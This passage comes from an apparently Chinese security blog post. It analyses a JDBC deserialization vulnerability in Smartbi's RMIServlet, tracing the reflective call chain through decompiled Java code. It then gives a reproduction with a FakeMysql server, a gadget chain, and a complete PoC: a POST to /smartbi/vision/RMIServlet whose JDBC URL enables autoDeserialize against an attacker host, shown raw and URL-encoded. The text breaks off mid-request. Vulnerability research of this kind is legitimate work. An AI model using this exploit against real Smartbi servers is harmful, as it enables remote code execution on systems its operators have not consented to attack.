class="hljs-keyword">void</span> <span class="hljs-title function_">testConnection</span><span class="hljs-params">(IDataSource dataSource)</span> &#123;<br>        MetaDataServiceImpl.getInstance().testConnection(dataSource);<br>    &#125;<br></code></pre></td></tr></table></figure><p>攻击者向<code>/vision/RMIServlet</code> 发送如下 POST 请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:18080<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-nim">className=<span class="hljs-type">DataSourceService</span>&amp;methodName=testConnection&amp;params=[<span class="hljs-meta">&#123;...&#125;</span>]</span><br></code></pre></td></tr></table></figure><p>通过类名和方法名反射调用，即：</p><p><code>className = DataSourceService</code> </p><p><code>methodName = testConnection</code> </p><p><code>params = [...]</code> 是 JSON 数组字符串，传进去后被包装成 <code>JSONArray</code> 类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">processExecute</span><span class="hljs-params">(HttpServletRequest request, String className, String methodName, String params)</span> &#123;<br>        <span class="hljs-comment">//RMIModule.getInstance() 返回一个远程服务模块（单例），它负责管理所有可远程调用的服务，getService(className) 根据类名获取对应的 ClientService 实例。</span><br>        <span class="hljs-type">ClientService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> RMIModule.getInstance().getService(className);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">resultStr</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//结果字符串的构建器 buff 用于生成最终 JSON 格式的响应体</span><br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">buff</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>()).append(<span class="hljs-string">&#x27;&#123;&#x27;</span>);<br>            <span class="hljs-comment">//判断 service 是否存在，未找到就抛出异常</span><br>            <span class="hljs-keyword">if</span> (service == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (className != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-type">Locale</span> <span class="hljs-variable">locale</span> <span class="hljs-operator">=</span> CommonConfiguration.getInstance().getLocale();<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">notFoundClass</span> <span class="hljs-operator">=</span> StringUtil.replaceLanguage(<span class="hljs-string">&quot;$&#123;Notfoundclass&#125;&quot;</span>, locale);<br>                    <span class="hljs-keyword">throw</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartbiException</span>(CommonErrorCode.UNKOWN_ERROR)).setDetail(className + <span class="hljs-string">&quot; &quot;</span> + notFoundClass);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//记录调用时间</span><br>                <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()).getTime();<br>                <span class="hljs-comment">//执行 execute 方法，即反射调用</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> service.execute(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(params));<br>                <span class="hljs-type">long</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()).getTime() - startTime;<br>                <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">null</span>) &#123;<br>                    buff.append(<span class="hljs-string">&quot;\&quot;retCode\&quot;:0&quot;</span>);<br>                &#125;              <br></code></pre></td></tr></table></figure><p>接着 <code>params</code> 调用下面的方法： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> service.execute(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(params));<br></code></pre></td></tr></table></figure><p><code>execute</code>方法处理逻辑：将传入的 <code>JSON</code> 转为 <code>IDataSource</code> 对象,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClientService</span> &#123;<br>    ...<br>    <span class="hljs-comment">//接收 JSON 数组和方法名</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">execute</span><span class="hljs-params">(String var1, JSONArray var2)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//从 this.a 中取出方法名对应的 Method 对象</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> (Method)<span class="hljs-built_in">this</span>.a.get(var1);<br>            <span class="hljs-comment">//不存在抛出异常</span><br>            <span class="hljs-keyword">if</span> (var3 == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">throw</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartbiException</span>(CommonErrorCode.METHOD_NAME_ERROR)).setDetail(var1);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//检查参数个数</span><br>                Class[] var4 = var3.getParameterTypes();<br>                <span class="hljs-keyword">if</span> (var4.length != var2.length()) &#123;<br>                    <span class="hljs-keyword">throw</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartbiException</span>(CommonErrorCode.PARAM_COUNT_ERROR)).setDetail(StringUtil.getLanguageValue(<span class="hljs-string">&quot;Method2&quot;</span>) + <span class="hljs-string">&quot;\&quot;&quot;</span> + var1 + <span class="hljs-string">&quot;\&quot;&quot;</span> + StringUtil.getLanguageValue(<span class="hljs-string">&quot;Thenumberofparametersis&quot;</span>) + <span class="hljs-string">&quot; &quot;</span> + var4.length + <span class="hljs-string">&quot; ,&quot;</span> + StringUtil.getLanguageValue(<span class="hljs-string">&quot;Butthenumberofargumentspassedinis&quot;</span>) + <span class="hljs-string">&quot; &quot;</span> + var2.length() + <span class="hljs-string">&quot; .&quot;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">//创建Java类型参数数组</span><br>                    Object[] var5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[var2.length()];<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-comment">//进行类型转换，将 JSON -&gt; Java对象</span><br>                        <span class="hljs-comment">//获取每个参数的泛型类型（var6）</span><br>                        Type[] var6 = var3.getGenericParameterTypes();<br>                        <span class="hljs-comment">//遍历 JSON 参数，使用工具类 JSONUtil.jsonToObject(...) 转为目标类型</span><br>                        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var7 &lt; var5.length; ++var7) &#123;<br>                            <span class="hljs-comment">//var2 是 JSONArray，也就是传入的 params</span><br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> var2.get(var7);<br>                            <span class="hljs-comment">//目标方法 testConnection 的参数类型即 IDataSource</span><br>                            <span class="hljs-type">Class</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var4[var7];<br>                            <span class="hljs-comment">//泛型类型</span><br>                            <span class="hljs-type">Type</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> var6[var7];<br>                            <span class="hljs-comment">//把 JSON 中的 JSONObject 转换成一个 Java 对象（var9 指定的类型），并作为方法参数传入</span><br>                            var5[var7] = JSONUtil.jsonToObject(var8, var9, var10);<br>                        &#125;<br>                    &#125; <br><br></code></pre></td></tr></table></figure><p>再进入 <code>DataSourceService.testConnection()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConnection</span><span class="hljs-params">(IDataSource dataSource)</span> &#123;<br>        MetaDataServiceImpl.getInstance().testConnection(dataSource);<br>    &#125;<br></code></pre></td></tr></table></figure><p>进入 <code>MetaDataServiceImpl.testConnection()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Java">conn = ConnectionPool.getInstance().getConnection(ds);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MetaDataServiceImpl</span> &#123;<br>    ...<br>    <span class="hljs-comment">//主要是将 IDataSource 转换为系统内部 DataSource 对象，然后尝试建立连接</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConnection</span><span class="hljs-params">(IDataSource dataSource)</span> &#123;<br>    <span class="hljs-comment">//实例化 Smartbi 内部使用的 DataSource 类</span><br>    <span class="hljs-type">DataSource</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSource</span>();<br>    <span class="hljs-comment">//UUIDGenerator.generate() 应是一个工具类，生成随机 UUID</span><br>    ds.setId(UUIDGenerator.generate());<br>    <span class="hljs-comment">//把外部传入的 IDataSource 转成系统内部 DataSource格式</span><br>    ds.setName(dataSource.getName());<br>    ds.setAlias(dataSource.getAlias());<br>    ds.setDriver(dataSource.getDriver());<br>    ds.setDesc(dataSource.getDesc());<br>    ds.setDbCharset(dataSource.getDbCharset());<br>    ds.setUrl(dataSource.getUrl());<br>    ds.setUser(dataSource.getUser());<br>    ds.setDriverType(dataSource.getDriverType());<br>    ds.setMaxConnection(dataSource.getMaxConnection());<br>    ds.setValidationQuery(dataSource.getValidationQuery());<br>    ds.setPassword(dataSource.getPassword());<br>    ds.setTransactionIsolation(dataSource.getTransactionIsolation());<br>    ds.setValidationQueryMethod(dataSource.getValidationQueryMethod());<br>    ds.setAuthenticationType(dataSource.getAuthenticationType());<br>    <span class="hljs-comment">//如果 IDataSource 没有提供密码，并且提供了 ID，那么从数据库中查询旧数据源信息，取出其密码，用于本次连接</span><br>    <span class="hljs-keyword">if</span> (dataSource.getPassword() == <span class="hljs-literal">null</span> &amp;&amp; !StringUtil.isNullOrEmpty(dataSource.getId())) &#123;<br>        <span class="hljs-type">DataSource</span> <span class="hljs-variable">dbDs</span> <span class="hljs-operator">=</span> FreeQueryDAOFactory.getDataSourceDAO().load(dataSource.getId());<br>        ds.setPassword(dbDs.getPassword());<br>    &#125;<br><br>    <span class="hljs-comment">//声明 JDBC 连接对象 conn，后续用于建立连接</span><br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//使用自定义的连接池 ConnectionPool 获取数据库连接</span><br>        conn = ConnectionPool.getInstance().getConnection(ds);<br>        <span class="hljs-keyword">if</span> (DBType.PRESTO == dataSource.getDriverType()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT 1&quot;</span>;<br>            <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> JdbcUtil.prepareStatement(conn, sql);<br></code></pre></td></tr></table></figure><p>进入 <code>ConnectionPool.getConnection()</code>：进行数据池连接</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.driverConnect(poolName, ds);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConnectionPool</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(IConnectionInfo ds)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//判断是否为系统知识库</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;DS.SYSTEM\u77e5\u8bc6\u5e93&quot;</span>.equals(ds.getId())) &#123;<br>        ds = <span class="hljs-built_in">this</span>.provider.getConnectionInfo(<span class="hljs-string">&quot;res&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//判断是否是 JNDI 数据</span><br>    <span class="hljs-keyword">if</span> (ds.getUrl().startsWith(<span class="hljs-string">&quot;JNDI:&quot;</span>)) &#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">cxt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> (DataSource)cxt.lookup(ds.getUrl().substring(<span class="hljs-string">&quot;JNDI:&quot;</span>.length()));<br>        <span class="hljs-keyword">return</span> dataSource.getConnection();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ds.getValidationQueryMethod() == <span class="hljs-number">3</span>) &#123;<span class="hljs-comment">//加载 JDBC 驱动</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">driverClass</span> <span class="hljs-operator">=</span> ds.getDriver();<br>        Class&lt;?&gt; clazz = <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//通过自定义的 DynamicLoadLibManager 加载该类</span><br>            clazz = DynamicLoadLibManager.loadClass(driverClass);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var12) &#123;<br>            <span class="hljs-comment">//如果失败，使用备用 classLoader 加载</span><br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">clzLoader</span> <span class="hljs-operator">=</span> (ClassLoader)Class.forName(<span class="hljs-string">&quot;smartbi.repository.DAOModule&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;classLoader&quot;</span>).get((Object)<span class="hljs-literal">null</span>);<br>            clazz = clzLoader == <span class="hljs-literal">null</span> ? Class.forName(driverClass) : clzLoader.loadClass(driverClass);<br>        &#125;<br>        <br><span class="hljs-comment">//创建 JDBC 驱动对象实例</span><br>        <span class="hljs-type">Driver</span> <span class="hljs-variable">jdbcDriver</span> <span class="hljs-operator">=</span> (Driver)clazz.newInstance();<br>        <span class="hljs-comment">//构建连接所需的属性（用户名、密码）</span><br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        prop.put(<span class="hljs-string">&quot;user&quot;</span>, ds.getUser());<br>        prop.put(<span class="hljs-string">&quot;password&quot;</span>, ds.getPassword());<br>        <span class="hljs-keyword">if</span> (ds.getDriverType() == DBType.KYLIN) &#123;<br>            prop.put(<span class="hljs-string">&quot;timezone&quot;</span>, <span class="hljs-string">&quot;GMT&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//通过反射调用 DriverManager.getConnection() 这个重载的私有方法</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> DriverManager.class.getDeclaredMethod(<span class="hljs-string">&quot;getConnection&quot;</span>, String.class, Properties.class, ClassLoader.class);<br>            m.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-comment">//使用系统中的 classLoader</span><br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">clzLoader</span> <span class="hljs-operator">=</span> (ClassLoader)Class.forName(<span class="hljs-string">&quot;smartbi.repository.DAOModule&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;classLoader&quot;</span>).get((Object)<span class="hljs-literal">null</span>);<br>            conn = m.invoke((Object)<span class="hljs-literal">null</span>, ds.getUrl(), prop, clzLoader);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var10) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> DriverManager.class.getDeclaredMethod(<span class="hljs-string">&quot;getConnection&quot;</span>, String.class, Properties.class, Class.class);<br>                m.setAccessible(<span class="hljs-literal">true</span>);<br>                conn = m.invoke((Object)<span class="hljs-literal">null</span>, ds.getUrl(), prop, clazz);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var9) &#123;<br>                conn = DriverManager.getConnection(ds.getUrl(), prop);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> (Connection)conn;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poolName</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (ds.getId().equals(<span class="hljs-string">&quot;DS.SYSTEM\u77e5\u8bc6\u5e93&quot;</span>)) &#123;<br>            poolName = <span class="hljs-string">&quot;res&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            poolName = <span class="hljs-built_in">this</span>.getPoolNameFromDatasource(ds);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            driver.getConnectionPool(poolName);<br>            <span class="hljs-comment">//调用 driverConnect 获取连接池连接</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.driverConnect(poolName, ds);<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException var11) &#123;<br>            <span class="hljs-built_in">this</span>.createPool(ds);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.driverConnect(poolName, ds);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>此时服务器向远程的<code>FakeMysql</code>尝试连接，就会接收到<code>FakeMysql</code>返回的恶意序列化数据，</p><h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a><strong>漏洞复现：</strong></h3><p>搭建 FakeMysql 服务器，用 Javachains 搭建，将 3308端口开启，监听的是<strong>本机IP地址的3308端口</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701134.png" alt="20250806161415587"></p><p>构造 K1链</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702650.png" alt="20250806162032486"></p><p>构造poc:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs perl">className=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>:<span class="hljs-number">100</span>,<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>:<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>:<span class="hljs-string">&quot;SELECT 1 FROM DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;jdbc:mysql://[本机IP]:3308/d4c5846?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>:<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>:-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;dbToCharset&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>:<span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br>-&gt;url编码<br>className=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span><span class="hljs-variable">%3a100</span>,<span class="hljs-string">&quot;user&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;SELECT+1+FROM+DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;jdbc%3amysql<span class="hljs-variable">%3a</span>//[本机IP]<span class="hljs-variable">%3a3308</span>/d4c5846%3fautoDeserialize%3dtrue<span class="hljs-variable">%2</span>6statementInterceptors<span class="hljs-variable">%3dcom</span>.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="hljs-string">&quot;name&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span><span class="hljs-variable">%3a</span>-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span><span class="hljs-variable">%3a0</span>,<span class="hljs-string">&quot;dbToCharset&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;STATIC&quot;</span>&#125;]<br><br><br><br><br>POST /smartbi/vision/RMIServlet HTTP/<span class="hljs-number">1.1</span><br>Host: localhost:<span class="hljs-number">18080</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">113.0</span><span class="hljs-number">.5672</span><span class="hljs-number">.127</span> Safari/<span class="hljs-number">537.36</span><br>Accept: *<span class="hljs-regexp">/*</span><br><span class="hljs-regexp">Origin: http:/</span><span class="hljs-regexp">/localhost</span><br><span class="hljs-regexp">Referer: http:/</span><span class="hljs-regexp">/localhost:18080/smar</span>tbi/vision/index.jsp<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;<span class="hljs-keyword">q</span>=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br>Cookie: JSESSIONID=0BBBD2EC4AE481FB607FC501FA04897E<br>Content-Type: application/<span class="hljs-keyword">x</span>-www-form-urlencoded;charset=UTF-<span class="hljs-number">8</span><br>Connection : keep-alive<br>Content-Length: <span class="hljs-number">580</span><br><br>className=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span><span class="hljs-variable">%3a</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span><span 